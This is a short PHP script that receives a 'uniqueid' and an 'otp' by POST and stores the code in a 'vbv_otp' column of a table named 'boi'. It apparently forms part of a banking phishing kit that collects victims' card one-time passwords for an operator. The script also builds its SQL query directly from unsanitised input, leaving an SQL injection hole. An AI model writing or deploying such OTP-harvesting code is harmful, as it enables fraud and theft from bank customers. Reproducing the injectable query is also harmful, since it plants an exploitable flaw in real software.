<?php
require '../connection.php';

if ($_POST["uniqueid"] and $_POST["otp"]) {
  $otp = $_POST["otp"];
  $uniqueid = $_POST["uniqueid"];

  $query = mysqli_query($conn, "UPDATE boi SET vbv_otp='$otp', status=0 WHERE uniqueid=$uniqueid");

  if ($query) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure'
    ));
  }
}

?>
